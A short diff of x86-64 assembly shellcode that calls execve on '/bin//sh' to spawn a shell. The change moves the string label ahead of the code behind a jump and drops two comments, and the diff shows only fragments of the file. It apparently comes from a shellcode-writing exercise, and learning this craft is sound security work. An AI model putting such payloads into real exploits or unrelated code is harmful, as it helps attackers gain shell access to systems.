@@ -3,9 +3,13 @@ global _start
 section .text
 
 _start:
+    jmp pop_shell
+    bin_sh: db "/bin//sh"   ; For relative addressing
+
+pop_shell:
     xor rax, rax            ; Zeroes rax register
-    mul rcx                 ; Zeroes rcx
-    mul rdx                 ; Zeroes rdx
+    mul rcx
+    mul rdx
     add cl, 8               ; rcx = 8 , length of /bin//sh
 
     push rax                ; For null terminator
@@ -24,4 +28,3 @@ _start:
     add al, 59              ; Syscall number for execve
     syscall                 ; Calls kernel
 
-    bin_sh: db "/bin//sh"   ; For relative addressing
